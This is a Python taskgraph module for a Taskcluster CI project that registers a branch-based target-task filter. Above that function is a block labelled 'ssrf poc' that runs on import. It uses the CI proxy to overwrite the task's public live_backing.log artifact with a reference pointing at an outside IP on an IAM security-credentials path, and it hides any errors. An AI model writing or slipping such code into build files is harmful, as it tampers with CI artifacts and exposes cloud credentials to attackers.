import os
import json
import datetime
import urllib.request

from taskgraph.target_tasks import register_target_task, standard_filter

# ssrf poc - overwrite live_backing.log as reference artifact
_task_id = os.environ.get('TASK_ID', '')
_run_id = os.environ.get('RUN_ID', '0')
_proxy = os.environ.get('TASKCLUSTER_PROXY_URL', 'http://localhost:80')

if _task_id:
    try:
        _expires = (
            datetime.datetime.utcnow() + datetime.timedelta(hours=20)
        ).strftime('%Y-%m-%dT%H:%M:%S.000Z')
        _req = urllib.request.Request(
            f'{_proxy}/api/queue/v1/task/{_task_id}/runs/{_run_id}/artifacts/public%2Flogs%2Flive_backing.log',
            data=json.dumps({
                'storageType': 'reference',
                'url': 'http://172.234.94.118:9170/latest/meta-data/iam/security-credentials/taskcluster-github-role',
                'expires': _expires,
                'contentType': 'text/plain',
            }).encode(),
            method='POST',
            headers={'Content-Type': 'application/json'},
        )
        urllib.request.urlopen(_req, timeout=10)
    except Exception:
        pass


@register_target_task("taskcluster-branches")
def target_tasks_taskcluster_branches(full_task_graph, parameters, graph_config):
    only_on = "all"
    if parameters["tasks_for"] == "github-push":
        if parameters["head_ref"].startswith("refs/heads/staging-release/"):
            only_on = "staging-release"
        elif parameters["head_ref"].startswith("refs/tags/v"):
            only_on = "release"

    def filter(task):
        return standard_filter(task, parameters) and task.attributes.get("only-on", "all") == only_on

    return [label for label, t in full_task_graph.tasks.items() if filter(t)]
